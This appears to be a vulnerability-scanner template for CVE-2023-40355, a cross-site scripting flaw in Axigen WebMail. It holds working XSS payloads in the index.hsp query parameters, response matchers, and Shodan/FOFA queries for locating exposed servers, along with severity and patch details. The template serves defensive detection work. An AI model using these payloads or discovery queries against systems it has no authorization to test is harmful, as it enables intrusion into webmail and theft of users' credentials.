http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - \\'-alert(document.domain),//
    - ''',alert(document.domain),'''
  - condition: and
    dsl:
    - contains(header, "text/html")
    - contains(response, "Axigen")
    - status_code == 200
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.hsp?passwordExpired=yes&username=\''-alert(document.domain),//'
  - '{{BaseURL}}/index.hsp?passwordExpired=yes&domainName=\''-alert(document.domain),//'
  - '{{BaseURL}}/index.hsp?m='',alert(document.domain),'''
  stop-at-first-match: true
id: CVE-2023-40355
info:
  author: amir-h-fallahi
  classification:
    cpe: cpe:2.3:a:axigen:axigen_mobile_webmail:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-40355
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.94415
    epss-score: 0.15395
  description: 'Cross Site Scripting (XSS) vulnerability in Axigen versions 10.3.3.0
    before 10.3.3.59, 10.4.0 before 10.4.19, and 10.5.0 before 10.5.5, allows authenticated
    attackers to execute arbitrary code and obtain sensitive information via the logic
    for switching between the Standard and Ajax versions.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript through various
    parameters in the version switching logic, potentially stealing email credentials
    and accessing sensitive communications of Axigen webmail users.

    '
  metadata:
    fofa-query: icon_hash=-1247684400
    max-request: 3
    product: axigen_mobile_webmail
    shodan-query: http.favicon.hash:-1247684400
    vendor: axigen
    verified: true
  name: Axigen WebMail - Cross-Site Scripting
  reference:
  - https://www.axigen.com/knowledgebase/Axigen-WebMail-XSS-Vulnerability-CVE-2023-40355-_396.html
  - https://nvd.nist.gov/vuln/detail/CVE-2023-40355
  remediation: 'Update Axigen to version 10.3.3.59, 10.4.19, or 10.5.5 or later that
    properly sanitizes input parameters in the version switching logic.

    '
  severity: medium
  tags: cve,cve2023,xss,axigen,webmail,vuln
